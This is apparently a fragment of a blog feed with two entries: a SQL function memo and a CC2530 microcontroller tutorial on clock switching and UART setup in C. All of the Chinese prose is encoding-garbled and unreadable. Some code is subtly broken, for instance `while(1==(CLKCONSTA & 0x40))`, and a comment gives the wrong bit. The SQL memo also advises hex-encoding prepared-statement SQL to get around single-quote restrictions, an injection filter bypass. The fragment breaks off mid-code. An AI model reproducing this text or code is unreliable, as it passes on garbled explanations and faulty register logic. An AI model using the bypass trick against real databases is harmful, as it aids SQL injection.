title="IF(expr1,expr2,expr3)"></a>IF(expr1,expr2,expr3)</h2><p>å¦‚æœ<strong>expr1</strong>æ˜¯<strong>TRUE(expr1&lt;&gt;0 and expr1&lt;&gt;NULL)</strong>ï¼Œåˆ™è¯­å¥å‘è¿”å›å€¼ä¸º<strong>expr2</strong>ï¼Œå¦åˆ™è¿”å›<strong>expr3</strong></p><p>å¦å¤–è¿˜æœ‰ä¸€ç§å†™æ³•ï¼š<code>case when expr1 then expr2 else expr3</code></p><h2 id="limit-i-n"><a href="#limit-i-n" class="headerlink" title="limit i,n"></a>limit i,n</h2><p><strong>i</strong>ï¼šä¸ºæŸ¥è¯¢ç»“æœçš„ç´¢å¼•å€¼ï¼Œé»˜è®¤ä»0å¼€å§‹</p><p><strong>n</strong>ï¼šä¸ºä»ç¬¬<strong>i</strong>æ¡å¼€å§‹ä¹‹åçš„<strong>n</strong>æ¡è®°å½•</p><h2 id="set-a-â€™-sql-â€™-prepare-table-from-a-execute-table"><a href="#set-a-â€™-sql-â€™-prepare-table-from-a-execute-table" class="headerlink" title="set  @a=â€™(sql)â€™;prepare (table) from @a;execute (table);"></a>set  @a=â€™(sql)â€™;prepare (table) from @a;execute (table);</h2><p><strong>sql</strong>ï¼šä¸ºè¦æ‰§è¡Œçš„sqlè¯­å¥ï¼Œå¯ä»¥å°†å…¶åŒ–ä¸ºåå…­è¿›åˆ¶åä¼ å…¥é¥¶è¿‡å•å¼•å·é™åˆ¶</p><p><strong>table</strong>ï¼šä¸ºæ‰§è¡Œsqlè¯­å¥çš„è¡¨</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214904653.png" alt loading="lazy"></p><h2 id="BINARY"><a href="#BINARY" class="headerlink" title="BINARY()"></a>BINARY()</h2><p>SQLè¯­å¥ä¸­é»˜è®¤æ˜¯ä¸åŒºåˆ†å¤§å°å†™ï¼Œåœ¨sqlè¯­å¥ä¸­åŠ ä¸Š<strong>binary</strong>å³å¯åŒºåˆ†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214747191.png" alt loading="lazy"></p><h2 id="CAST-expr-as-type-CONVERT-expr-type"><a href="#CAST-expr-as-type-CONVERT-expr-type" class="headerlink" title="CAST(expr as type),CONVERT(expr,type)"></a>CAST(expr as type),CONVERT(expr,type)</h2><p>è½¬æ¢ä»»æ„ç±»å‹<strong>expr</strong>ä¸ºæŒ‡å®šçš„<strong>type</strong>ç±»å‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214604050.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ—¶é’Ÿï¼Œä¸²å£é…ç½®</title>
      <link href="posts/11ef9369/"/>
      <url>posts/11ef9369/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ‡æ¢ç³»ç»Ÿé«˜é¢‘æ—¶é’Ÿæº"><a href="#åˆ‡æ¢ç³»ç»Ÿé«˜é¢‘æ—¶é’Ÿæº" class="headerlink" title="åˆ‡æ¢ç³»ç»Ÿé«˜é¢‘æ—¶é’Ÿæº"></a>åˆ‡æ¢ç³»ç»Ÿé«˜é¢‘æ—¶é’Ÿæº</h1><p>CC2530åœ¨æ­£å¸¸è¿è¡Œçš„æ—¶å€™éœ€è¦ä¸€ä¸ªé«˜é¢‘æ—¶é’Ÿä¿¡å·å’Œä¸€ä¸ªä½é¢‘çš„æ—¶é’Ÿä¿¡å·</p><ul><li>é«˜é¢‘æ—¶é’Ÿä¿¡å·ï¼šä¸»è¦ä¾›ç»™ç»™CPUï¼Œä¿è¯ç¨‹åºçš„è¿è¡Œ</li><li>ä½é¢‘æ—¶é’Ÿä¿¡å·ï¼šä¸»è¦ä¾›ç»™çœ‹é—¨ç‹—ï¼Œç¡çœ å®šæ—¶å™¨ç­‰åä¸Šå¤–è®¾</li></ul><p>æ—¶é’Ÿä¿¡å·æ¥æº</p><ul><li>é«˜é¢‘ä¿¡å·ä¸¤ä¸ªæ¥æºï¼šèŠ¯ç‰‡å†…éƒ¨çš„16M RCç”µè·¯ï¼›å¤–æ¥çš„32MçŸ³è‹±æ™¶æŒ¯</li><li>ä½é¢‘ä¿¡å·ä¸¤ä¸ªæ¥æºï¼šèŠ¯ç‰‡å†…éƒ¨çš„32K RCç”µè·¯ï¼Œå¤–æ¥çš„32.768KçŸ³è‹±æ™¶æŒ¯</li></ul><span id="more"></span><p>CC2530é»˜è®¤ä¸Šç”µçš„æ—¶å€™ï¼Œæ˜¯å†…éƒ¨çš„2ä¸ªRCç”µè·¯ä½œä¸ºé«˜é¢‘å’Œä½é¢‘çš„æ—¶é’Ÿæ¥æº</p><p>å¦‚æœæˆ‘ä»¬åœ¨ç”¨ä¸²å£ï¼Œç‰¹åˆ«æ˜¯æ— çº¿é€šä¿¡çš„æ—¶å€™ï¼Œå¿…é¡»è¦ç”¨32Mçš„çŸ³è‹±æ™¶æŒ¯ä½œä¸ºé«˜é¢‘æ—¶é’Ÿæ¥æºï¼Œ16Mæ¯”32Mçš„é€Ÿåº¦æ…¢ï¼Œä¸º32Mçš„1/2</p><p>é«˜é¢‘æ—¶é’Ÿæºç‰¹ç‚¹ï¼š</p><ul><li>ä¸¤ä¸ªé«˜é¢‘æ—¶é’Ÿæºå¯ä»¥åŒæ—¶èµ·æŒ¯äº§ç”Ÿé«˜é¢‘æ—¶é’Ÿä¿¡å·</li><li>è€Œä¸¤ä¸ªä½é¢‘æ—¶é’Ÿæºï¼ŒæŸä¸€æ—¶åˆ»åªèƒ½æœ‰1ä¸ªèµ·æŒ¯ï¼Œå¹¶ä¸”èµ·æŒ¯èƒ½çš„è¿™ä¸ªæ—¶é’Ÿæºä¾›ç»™CC2530</li></ul><p>åˆ‡æ¢æ­¥éª¤ï¼š</p><p>1ã€2ä¸ªé«˜é¢‘æ—¶é’Ÿæºèµ·æŒ¯ï¼› è®©SLEEPCMDçš„ç¬¬2ä½ä¸º0ï¼›</p><pre class="language-c" data-language="c"><code class="language-c">SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span><span class="token comment">//1111 1011 å¼€å¯2ä¸ªé«˜é¢‘æ—¶é’Ÿæº</span></code></pre><p>2ã€å¾…ç›®æ ‡æ—¶é’ŸæºæŒ¯è¡ç¨³å®šï¼›SLEEPSTAå¯„å­˜å™¨çš„ç¬¬6ä½ä¸º1è¡¨ç¤º32 æ—¶é’Ÿæºç¨³å®š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0100 0000 ç­‰å¾…32Mç¨³å®š</span></code></pre><p>3ã€ å»¶æ—¶ä¸€å°æ®µæ—¶é—´63usï¼ˆä¸å®šï¼‰ï¼› è¶…è¿‡63å¾®ç§’å»¶æ—¶</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">delayus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//è°ƒç”¨å‡½æ•°å®ç°</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> k<span class="token operator">=</span><span class="token number">63</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>4ã€ä¸åˆ†é¢‘è¾“å‡ºï¼› æŠŠå¯„å­˜å™¨CLKCONCMDçš„ä½3ä½ è®¾ç½®ä¸º000ï¼Œè¡¨ç¤ºä¸åˆ†é¢‘è¾“å‡º</p><pre class="language-c" data-language="c"><code class="language-c">CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span><span class="token comment">//1111 1000 ä¸åˆ†é¢‘è¾“å‡º</span></code></pre><p>5ã€ é€‰ä¸­ç›®æ ‡é«˜é¢‘æ—¶é’Ÿæºä½œä¸ºç³»ç»Ÿä¸»æ—¶é’Ÿï¼› æŠŠå¯„å­˜å™¨CLKCONCMDçš„ç¬¬6ä½ æ¸…0ï¼Œè®¾ç½®32Mä½œä¸ºç³»ç»Ÿä¸»æ—¶é’Ÿ</p><pre class="language-c" data-language="c"><code class="language-c">CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0XBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 è®¾ç½®32Mä½œä¸ºç³»ç»Ÿä¸»æ—¶é’Ÿ</span></code></pre><p>6ã€ç¡®è®¤ä¸€ä¸‹å½“å‰å·¥ä½œçš„ç³»ç»Ÿæ—¶é’Ÿæ˜¯ä¸æ˜¯æ‰€é€‰çš„é«˜é¢‘æ—¶é’Ÿï¼›å¦‚æœè¯»CLKCONSTAè¿™ä¸ªå¯„å­˜å™¨çš„ç¬¬6ä½ä¸º0ï¼Œè¡¨ç¤º32Mçš„æ—¶é’Ÿæºå·²ç»ä½œä¸ºäº†å½“å‰çš„ç³»ç»Ÿä¸»æ—¶é’Ÿï¼Œç¨‹åºå¯ä»¥å¾€ä¸‹è¿è¡Œäº†ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0100 0000 ç­‰å¾…32MæˆåŠŸæˆä¸ºå½“å‰ç³»ç»Ÿä¸»æ—¶é’Ÿ</span></code></pre><h1 id="æ•°ç ç®¡æµ‹è¯•"><a href="#æ•°ç ç®¡æµ‹è¯•" class="headerlink" title="æ•°ç ç®¡æµ‹è¯•"></a>æ•°ç ç®¡æµ‹è¯•</h1><p>32Mä»£ç ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iocc2530.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span><span class="token keyword">void</span> <span class="token function">delayus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> k<span class="token operator">=</span><span class="token number">63</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">800</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span><span class="token comment">//1111 1011 å¼€å¯2ä¸ªé«˜é¢‘æ—¶é’Ÿæº</span>   <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0100 0000 ç­‰å¾…32Mç¨³å®š</span>   <span class="token function">delayus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span><span class="token comment">//1111 1000 ä¸åˆ†é¢‘è¾“å‡º</span>   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0XBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 è®¾ç½®32Mä½œä¸ºç³»ç»Ÿä¸»æ—¶é’Ÿ</span>   <span class="token keyword">while</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0100 0000 ç­‰å¾…32MæˆåŠŸæˆä¸ºå½“å‰ç³»ç»Ÿä¸»æ—¶é’Ÿ</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">char</span> i<span class="token punctuation">;</span>     <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>            <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ•°ç ç®¡æ˜¾ç¤ºå‡½æ•°ï¼Œiä¸ºå‡ ï¼Œæ•°ç ç®¡æ˜¾ç¤ºå‡ </span>            <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>16Mä»£ç ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iocc2530.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span><span class="token keyword">void</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">800</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">char</span> i<span class="token punctuation">;</span>     <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>            <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦å¤–é™„ä¸Š74LS164_8LED æ•°ç ç®¡æ˜¾ç¤ºçš„ä»£ç ï¼ŒæŠŠä»£ç æ·»åŠ åˆ°å·¥ç¨‹é‡Œå³å¯</p><p>74LS164_8LED.h</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__74LS164_8LED_H__</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__74LS164_8LED_H__</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ioCC2530.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>  <span class="token macro-name">LS164_DATA</span>  <span class="token expression">P1_3</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>  <span class="token macro-name">LS164_CLK</span>   <span class="token expression">P1_2</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>  <span class="token macro-name">UCHAR</span>  <span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> </span></span><span class="token keyword">void</span> <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>UCHAR Data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//P1.3  DATA   P1.2  CLK</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span></code></pre><p>74LS164_8LED.c</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ioCC2530.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span><span class="token keyword">static</span> UCHAR LED_Map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0x5b</span><span class="token punctuation">,</span><span class="token number">0x4f</span><span class="token punctuation">,</span>                        <span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span>                        <span class="token number">0x7f</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    P1SEL <span class="token operator">&amp;=</span><span class="token operator">~</span><span class="token number">0x0C</span><span class="token punctuation">;</span><span class="token comment">//xxxx 00xx  é…ç½®ä¸ºæ™®é€šIOæ¨¡å¼</span>    P1DIR <span class="token operator">|=</span><span class="token number">0x0C</span><span class="token punctuation">;</span><span class="token comment">//xxxx 11xx   é…ç½®ä¸ºè¾“å‡ºæ¨¡å¼</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>UCHAR Index<span class="token punctuation">)</span> <span class="token comment">//P1.3  DATA   P1.2  CLK</span><span class="token punctuation">&#123;</span>      UCHAR i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    UCHAR Data<span class="token operator">=</span>LED_Map<span class="token punctuation">[</span>Index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&amp;</span> Data<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            LS164_DATA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            LS164_DATA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>        Data<span class="token operator">=</span>Data <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>        LS164_CLK<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        LS164_CLK<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="USBè½¬ä¸²å£é…ç½®"><a href="#USBè½¬ä¸²å£é…ç½®" class="headerlink" title="USBè½¬ä¸²å£é…ç½®"></a>USBè½¬ä¸²å£é…ç½®</h1><p>CC2530å…·å¤‡ä¸¤ä¸ªä¸²å£ï¼Œä¸”æ¯ä¸ªä¸²å£éƒ½å¯ä»¥é…ç½®é€‰æ‹©æ§åˆ¶è„š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-0.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-91.png" alt loading="lazy"></p><p><strong>æ­¥éª¤ï¼š</strong></p><p>1ã€æŒ‡å®šä¸²å£çš„IOä½ç½®</p><pre class="language-c" data-language="c"><code class="language-c">PERCFG <span class="token operator">&amp;=</span><span class="token number">0xFE</span><span class="token punctuation">;</span><span class="token comment">//1111 1110 é€‰ä¸­ä¸²å£0çš„çš„å¤‡ç”¨ä½ç½®1</span></code></pre><p>2ã€ç›¸åº”IOé…ç½®æˆåä¸Šå¤–è®¾åŠŸèƒ½</p><pre class="language-c" data-language="c"><code class="language-c">P0SEL <span class="token operator">|=</span><span class="token number">0x0C</span><span class="token punctuation">;</span>       <span class="token comment">//0000 1100 P0_2 p0_3ä¸ºåä¸Šå¤–è®¾åŠŸèƒ½</span></code></pre><p>3ã€8ä¸ªæ•°æ®ä½ï¼Œ1ä¸ªåœæ­¢ä½ï¼Œæ— æµæ§ï¼Œæ— æ ¡éªŒç¡®ç«‹</p><pre class="language-c" data-language="c"><code class="language-c">U0CSR <span class="token operator">|=</span><span class="token number">0Xc0</span><span class="token punctuation">;</span></code></pre><p>4ã€æ³¢ç‰¹ç‡è®¾ç½®</p><pre class="language-c" data-language="c"><code class="language-c">U0GCR <span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>U0BAUD<span class="token operator">=</span><span class="token number">59</span><span class="token punctuation">;</span></code></pre><img src="https://gitee.com/Extrader/blogimage/raw/master/image/æ—¶é’Ÿï¼Œä¸²å£é…ç½®/image-95.png" style="zoom: 80%;" loading="lazy"><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-92-e1579148396866.png" alt loading="lazy"></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/æ—¶é’Ÿï¼Œä¸²å£é…ç½®/image-94.png" style="zoom:67%;" loading="lazy"><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-93.png" alt loading="lazy"></p><p>5ã€å¼€CPUä¸­æ–­ï¼Œå¯¹åº”ä¸²å£æ¥æ”¶ä¸­æ–­</p><pre class="language-c" data-language="c"><code class="language-c">EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>URX0IE<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//ç»“å°¾ä¸º0æˆ–8åˆ™å¯ä»¥ç›´æ¥é€‰æ‹©èµ‹å€¼</span></code></pre><p>USART0æ¥æ”¶å­—ç¬¦åˆ©ç”¨ä¸­æ–­æœåŠ¡å‡½æ•°</p><ul><li><p>å½“ä¸€ä¸ªå­—èŠ‚ç”±ä¸²å£æ¥æ”¶åˆ°C2530ï¼Œå­—èŠ‚ä¼šä¿å­˜åˆ°U0DBUFå¯„å­˜å™¨ï¼ŒåŒæ—¶æ¥æ”¶ä¸­æ–­æ ‡å¿—URX0IFä½ä¼šç½®1</p></li><li><p>å¯ä»¥åˆ©ç”¨ä¸­æ–­æœåŠ¡ç¨‹åºæ¥æ¥æ”¶è¯¥å­—ç¬¦ä¸²</p></li><li><p>ä¸­æ–­æœåŠ¡å‡½æ•°</p><p>#pragma vector = URX0_VECTOR<br>__interrupt void UART0_ISR(void)</p></li></ul><h1 id="æ€»æµ‹è¯•ä»£ç "><a href="#æ€»æµ‹è¯•ä»£ç " class="headerlink" title="æ€»æµ‹è¯•ä»£ç "></a><strong>æ€»æµ‹è¯•ä»£ç </strong></h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iocc2530.h></span></span><span class="token keyword">char</span> ch<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Cfg32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span> <span class="token comment">//fB 0 00 è®©2ä¸ªæ—¶é’Ÿæºéƒ½èµ·æŒ¯</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//  0100 0000  å¦‚æœ32M æ™¶æŒ¯ä¾›ç”µä¸”ç¨³å®šäº†ï¼Œé‚£ä¹ˆç¨‹åºå¾€ä¸‹è¿è¡Œ</span>    CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span> <span class="token comment">//1111 1000 ä¸åˆ†é¢‘è¾“å‡º</span>    CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 è®©32Mä½œä¸ºç³»ç»Ÿä¸»æ—¶é’Ÿä¾›ç»™CPU</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">==</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¦‚æœ32Mç¡®å®ä¾›ç»™CPUåœ¨å·¥ä½œï¼Œé‚£ä¹ˆç¨‹åºå¾€ä¸‹æ‰§è¡Œ</span>    SLEEPCMD <span class="token operator">|=</span><span class="token number">0x40</span><span class="token punctuation">;</span><span class="token comment">// 0000 0100 </span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">UartCfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//ä¸²å£0çš„å¤‡ç”¨ä½ç½®1é…ç½®æˆæ³¢ç‰¹ç‡9600</span>   PERCFG <span class="token operator">&amp;=</span><span class="token number">0xFE</span><span class="token punctuation">;</span><span class="token comment">//1111 1110 é€‰ä¸­ä¸²å£0çš„çš„å¤‡ç”¨ä½ç½®1</span>   P0SEL  <span class="token operator">|=</span><span class="token number">0x0C</span><span class="token punctuation">;</span>       <span class="token comment">//0000 1100 P0_2 p0_3ä¸ºåä¸Šå¤–è®¾åŠŸèƒ½</span>      U0CSR <span class="token operator">|=</span><span class="token number">0Xc0</span><span class="token punctuation">;</span>      U0GCR <span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>   U0BAUD<span class="token operator">=</span><span class="token number">59</span><span class="token punctuation">;</span>   EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>   URX0IE<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span 